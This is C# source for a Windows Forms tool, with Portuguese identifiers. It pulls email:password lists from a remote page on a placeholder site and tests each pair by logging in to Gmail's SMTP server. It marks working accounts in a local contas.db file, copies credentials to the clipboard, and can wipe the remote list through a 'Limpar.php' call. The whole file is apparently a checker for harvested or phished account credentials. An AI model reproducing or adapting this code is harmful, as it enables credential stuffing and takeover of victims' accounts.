using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Mail;
using System.IO;
using System.Threading;

namespace Wonder
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        List<Conta> ContasNaoVerificadas = new List<Conta>();
        List<Conta> ContasDataBase = new List<Conta>();
        struct Links
        {
            public const string Site = "Seu WebSite";
            public const string PageContas = Site + "cnts.cnt";
            public const string PageLimpar = Site + "Limpar.php";
        }
        bool LogarGmail(string Usuario, string Senha)
        {
            try
            {

                if (Usuario.Length <= 0 || Senha.Length <= 0) return false;
                using (MailMessage mail = new MailMessage())
                {
                    mail.From = new MailAddress(Usuario);
                    mail.To.Add(Usuario);
                    mail.Subject = "Gabriel12";
                    mail.Body = "1232132";
                    mail.IsBodyHtml = true;
                    using (SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587))
                    {
                        smtp.UseDefaultCredentials = false;
                        smtp.Credentials = new NetworkCredential(Usuario, Senha);
                        smtp.EnableSsl = true;
                        smtp.Send(mail);
                    }
                }
                return true;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return false;
            }
        }
        public static string[] Separar(string separator, string source)
        {
            return source.Split(new string[] { separator }, StringSplitOptions.None);
        }
        void Atualizar(bool Auto)
        {
            listView1.Items.Clear();
            WebClient wc = new WebClient();
            string g = wc.DownloadString(Links.PageContas);
            if (g != null)
            {
                string[] linhas = Separar("\n", g);
                foreach (string Linha in linhas)
                {
                    if (Linha.Contains("@") && Linha.Contains(":"))
                    {
                        Conta t = new Conta();
                        string[] s = Separar(":", Linha);
                        t.Email = s[0];
                        t.Senha = s[1];
                        ContasNaoVerificadas.Add(t);
                        string[] Colunas = { t.Email, t.Senha };
                        ListViewItem f = new ListViewItem(Colunas);
                        listView1.Items.Add(f);
                    }
                }
            }
            else { if (!Auto) MessageBox.Show("Não há contas"); }
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            Atualizar(false);
            Abrir();
            timer1.Start();
        }

        private void mandarEmailManualToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                textBox1.Text = listView1.SelectedItems[0].SubItems[0].Text;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                Atualizar(true);
            }
        }
        void Log(string sLog)
        {
            this.Invoke((MethodInvoker)(() => this.lblStatus.Text = sLog));
        }
        private void button2_Click(object sender, EventArgs e)
        {

        }
        Conta RetornaConta(string LInha)
        {
            Conta c = new Conta();
            if(LInha.Count(t => t == ':') >= 2) 
            {
                string[] s = Separar(":", LInha);
                c.Email = s[0];
                c.Senha = s[1];
                c.Centro_Vila = s[2];
                c.Funcionando = s[3];
            }
            return c;
        }
        private void AddLista(Conta t)
        {
            string[] Colunas = { t.Email, t.Senha, t.Funcionando, t.Centro_Vila };
            if (t.Email == "teste@teste") return;
            ListViewItem f = new ListViewItem(Colunas);
            listView2.Items.Add(f);
        }

        private void Abrir()
        {
            string[] Linhas = File.ReadAllLines("contas.db");
            ContasDataBase.Clear();
            foreach (string Linha in Linhas)
            {
                ContasDataBase.Add(RetornaConta(Linha));
                AddLista(RetornaConta(Linha));
            }
        }
        string RetornaLinha(Conta c)
        {
            return "" + c.Email + ":" + c.Senha + ":" +  c.Centro_Vila + ":" + c.Funcionando;
        }
        private void Salvar()
        {
            File.WriteAllText("contas.db", "");
            string Retorna = "";
            foreach(Conta c in ContasDataBase)
            {
                Retorna += RetornaLinha(c) + Environment.NewLine;
            }
            File.WriteAllText("contas.db", Retorna);
        }
        void VerificarListaNaoVer()
        {
            foreach (Conta c in ContasNaoVerificadas)
            {
                if (LogarGmail(c.Email, c.Senha))
                {
                    c.Funcionando = "Funcionando";
                }
                else
                {
                    c.Funcionando = "Não está Funcionando";
                }
            }
        }
        void VerificarListaDB()
        {
            this.Invoke((MethodInvoker)(() => this.Enabled = false));
            int Max = listView2.Items.Count;
            for(int i = 0; i < Max; i++)
            {
                if(LogarGmail(listView2.Items[i].SubItems[0].Text, listView2.Items[i].SubItems[1].Text))
                {
                    ContasDataBase[i].Funcionando = "Funcionando";
                    this.Invoke((MethodInvoker)(() => listView2.Items[i].SubItems[2].Text = "Funcionando"));
                }
                else
                {
                    ContasDataBase[i].Funcionando = "Não Funciona";
                    this.Invoke((MethodInvoker)(() => listView2.Items[i].SubItems[2].Text = "Nâo Funciona"));
                }
            }
            this.Invoke((MethodInvoker)(() => this.Enabled = true));
        }
        void VerificarConta(Conta c)
        {
            this.Invoke((MethodInvoker)(() => this.Enabled = false));
            Log("Verificando " + c.Email);
            if(LogarGmail(c.Email, c.Senha))
            {
                Log("Conta Funcionando");
            }
            else
            {
                Log("Não Está Funcionando");
            }
            this.Invoke((MethodInvoker)(() => this.Enabled = true));
        }
        void tVerificar(string Email, string Senha)
        {
            Thread t = new Thread(() => VerificarConta(new Conta { Email = Email, Senha = Senha }) );
            t.IsBackground = true;
            t.Start();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            tVerificar(textBox1.Text, textBox2.Text);
        }
 
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Abrir();
        }

        private void verificarToolStripMenuItem_Click(object sender, EventArgs e)
        {
           
        }

        private void tudoToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Thread t = new Thread(() => VerificarListaDB());
            t.IsBackground = true;
            t.Start();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Conta t = new Conta();
            t.Email = textBox4.Text;
            t.Senha = textBox3.Text;
            t.Centro_Vila = textBox5.Text;
            textBox4.Text = "";
            textBox3.Text = "";
            textBox5.Text = "";
            t.Funcionando = "Não Verificado";
            ContasDataBase.Add(t);
            AddLista(t);
        }

        private void somenteSelecionadaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.Invoke((MethodInvoker)(() => this.Enabled = false));
            int i = listView2.SelectedIndices[0];
            if (LogarGmail(listView2.Items[i].SubItems[0].Text, listView2.Items[i].SubItems[1].Text))
            {
                ContasDataBase[i].Funcionando = "Funcionando";
                this.Invoke((MethodInvoker)(() => listView2.Items[i].SubItems[2].Text = "Funcionando"));
            }
            else
            {
                ContasDataBase[i].Funcionando = "Não Funciona";
                this.Invoke((MethodInvoker)(() => listView2.Items[i].SubItems[2].Text = "Nâo Funciona"));
            }
            this.Invoke((MethodInvoker)(() => this.Enabled = true));
        }

        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            textBox1.Text = listView2.Items[listView2.SelectedIndices[0]].SubItems[0].Text;
        }

        private void emailToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(listView2.Items[listView2.SelectedIndices[0]].SubItems[0].Text);
        }

        private void senhaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(listView2.Items[listView2.SelectedIndices[0]].SubItems[1].Text);
        }

        private void emailSenhaCVToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(listView2.Items[listView2.SelectedIndices[0]].SubItems[0].Text + ":" + listView2.Items[listView2.SelectedIndices[0]].SubItems[1].Text + ":" + listView2.Items[listView2.SelectedIndices[0]].SubItems[3].Text);
        }

        private void atualizarToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Atualizar(false);
        }

        private void limparToolStripMenuItem_Click(object sender, EventArgs e)
        {
            WebClient wc = new WebClient();
            wc.DownloadString(Links.PageLimpar);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Salvar();
        }

        private void salvarToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Salvar(); 
        }
    }
    class Conta
    {
        public string Email;
        public string Senha;
        public string Funcionando;
        public string Centro_Vila;
    }
}
